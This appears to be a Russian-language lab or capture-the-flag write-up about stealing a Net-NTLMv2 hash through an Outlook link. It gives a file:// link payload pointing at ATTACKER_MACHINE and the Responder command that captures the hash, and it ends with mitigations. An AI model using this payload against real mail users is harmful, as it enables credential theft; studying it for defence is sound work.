# Microsoft Windows Server 2019 Standard (10.0.17763 Build 17763) - Получение удаленного доступа

Цель: нужно, чтобы пользователь нажал на ссылку в Outlook.
Сложность: Easy

## Разведка
Email выдали в задании

## Находка
Это уязвимость передачи хэша Net-NTLMv2 злоумышленнику путем отправки жертве на ее email в Outlook web информации в виде ссылки, которая пытается открыть IP адрес злоумышленника, но Outlook обращается к SMB-порту, затем проходит аутентификацию и тем самым отдает challenge-response злоумышленнику . Эта уязвимость существует, потому что приложение Outlook не воспринимает ссылку с «!», как опасную ссылку:
«<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>», поэтому не запускает защищенный режим просмотра.

## Эксплуатация:
Выбор сетевого интерфейса «ip a», создание SMB-слушателя на выбранном интерфейсе, в моем случае ens5: «responder -I ens5» -> запуск скрипта для отправки web сообщения с гиперссылкой, злоумышленник получил доступ к хэшу Net-NTLMv2.

## Вывод:
Эту дыру временно бы закрыла проверка ссылки на наличие «!». Но для решения проблемы нужно:
1. Обновить Outlook
2. Закрыть исходящий SMB на порту 445
